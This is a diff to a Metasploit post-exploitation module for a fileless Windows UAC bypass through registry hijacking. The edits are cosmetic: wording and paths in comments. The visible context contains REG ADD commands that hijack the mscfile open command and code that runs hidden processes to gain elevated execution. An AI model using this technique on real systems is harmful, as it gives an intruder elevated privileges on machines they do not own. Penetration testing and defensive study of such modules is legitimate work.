@@ -103,7 +103,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [registry hijacking]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe OR powershell.exe to execute command. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe OR powershell.exe to execute our command. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -251,8 +251,8 @@ end
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -Command start notepad.exe" /f
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "C:\Windows\powershell.exe -Command start notepad.exe" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution ..")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
@@ -417,7 +417,8 @@ def ls_stage3
     print_line("")
     print_line("")
 
-  # building better reports outputs
+
+  # building better report outputs
   if report_on == "EXPLOITABLE"
     print_line("    REPORT : System reports that vulnerability its present: [HKCR]")
   else
